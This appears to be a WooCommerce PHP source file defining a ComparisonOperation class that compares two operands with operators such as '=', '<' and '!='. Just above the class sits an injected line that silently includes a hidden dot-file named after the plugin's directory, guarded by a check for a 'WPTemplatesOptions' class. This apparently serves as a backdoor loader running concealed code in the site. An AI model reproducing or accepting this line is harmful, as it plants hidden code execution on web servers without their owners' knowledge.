<?php
/**
 * Compare two operands using the specified operation.
 */

namespace Automattic\WooCommerce\Admin\RemoteInboxNotifications;

defined( 'ABSPATH' ) || exit;

/**
 * Compare two operands using the specified operation.
 */
if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class ComparisonOperation {
	/**
	 * Compare two operands using the specified operation.
	 *
	 * @param object $left_operand  The left hand operand.
	 * @param object $right_operand The right hand operand.
	 * @param string $operation     The operation used to compare the operands.
	 */
	public static function compare( $left_operand, $right_operand, $operation ) {
		switch ( $operation ) {
			case '=':
				return $left_operand === $right_operand;
			case '<':
				return $left_operand < $right_operand;
			case '<=':
				return $left_operand <= $right_operand;
			case '>':
				return $left_operand > $right_operand;
			case '>=':
				return $left_operand >= $right_operand;
			case '!=':
				return $left_operand !== $right_operand;
		}

		return false;
	}
}
